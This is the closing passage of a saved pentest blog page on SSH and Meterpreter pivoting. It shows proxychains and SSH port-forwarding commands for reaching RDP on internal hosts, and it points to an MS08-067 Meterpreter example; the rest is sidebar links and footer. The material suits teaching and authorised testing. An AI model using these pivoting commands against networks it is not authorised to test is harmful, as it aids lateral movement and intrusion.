+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">proxychains rdesktop 192.168.2.3</span>
+</p>
+</div>
+</div>
+</section>
+<h5 id="ssh-port-forwarding-command">SSH Port Forwarding Command<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding-command"><i class="fa fa-link"></i></a></h5>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">RDP SSH Port Forwarding</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">ssh -L 3389:192.168.2.3:3389 user@192.168.2.2</span>
+</p>
+</div>
+</div>
+</section>
+<p>You could then connect to Target 2’s RDP server using:</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">Connecting to RDP via SSH Port Forwarding</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">rdesktop 127.0.0.1</span>
+</p>
+</div>
+</div>
+</section>
+<h3 id="ssh-and-meterpreter-pivoting">SSH and Meterpreter Pivoting<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-and-meterpreter-pivoting"><i class="fa fa-link"></i></a></h3>
+<p>This example uses SSH pivoting and Meterpreter port forwarding to access machines on subnet 2.</p>
+<p><img src="./SSH&MeterpreterPivotingTechniques_files/gyylQup.png" alt="Pivot Example 3: Using SSH and Meterpreter Pivoting to access another subnet"></p>
+<h4 id="example-commands-1">Example commands<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#example-commands-1"><i class="fa fa-link"></i></a></h4>
+<p>The above commands would be leveraged to reach <strong>Target 2</strong>, from <strong>Target 2</strong> to <strong>Target 3</strong>, meterpreter would be used. Follow the <a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet">meterpreter portwarding example</a> above for a MS08-067 example.</p>
+<p>If this was helpfull, click tweet below.</p>
+<p>Enjoy.</p>
+<hr>
+<p>Follow <a href="https://twitter.com/Arr0way">@Arr0way</a> - resistence is futile...</p>
+<div>
+<img src="chrome-extension://pkehgijcmpdhfbdbbnkijodmdjhbjlgp/skin/socialwidgets/Twitter.svg" class="privacyBadgerReplacementButton" title="PrivacyBadger has replaced this Twitter button.">
+<script data-cfasync="false">!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+</div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/">All Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/cheat-sheet/">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/techniques/">Techniques</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/tools/">Tools</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/security-hardening/">Security Hardening</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/walkthroughs/">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/vi-cheat-sheet/">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/cheat-sheet/">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/walkthroughs/">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="current">
+<a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/">SSH &amp; Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/techniques/">More »</a>
+</li>
+</ul>
+<h4>Tools</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/tools/">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/security-harden-centos-7/">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/security-hardening/">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/urandom/">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are ©&nbsp;2016 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<a href="https://github.com/">
+<img src="./SSH&MeterpreterPivotingTechniques_files/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script type="text/rocketscript" data-rocketoptimized="true">
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+
+
+</body></html>
